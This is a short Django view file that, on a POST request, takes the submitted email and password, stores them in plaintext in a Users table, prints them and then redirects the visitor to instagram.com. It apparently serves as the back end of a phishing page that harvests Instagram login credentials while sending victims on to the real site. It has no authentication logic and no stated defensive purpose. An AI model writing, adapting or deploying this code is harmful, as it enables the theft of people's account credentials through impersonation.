from django.shortcuts import render
from django.http import HttpResponseNotAllowed
from .models import * 
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import redirect

@csrf_exempt
def index(request):
    if request.method=="POST":
        username = request.POST["email"]
        password = request.POST["password"]
        mode = Users.objects.create(username=username,password=password) 
        mode.save()
        print(mode)
        return  redirect("https://instagram.com")
    return HttpResponseNotAllowed("not allowed")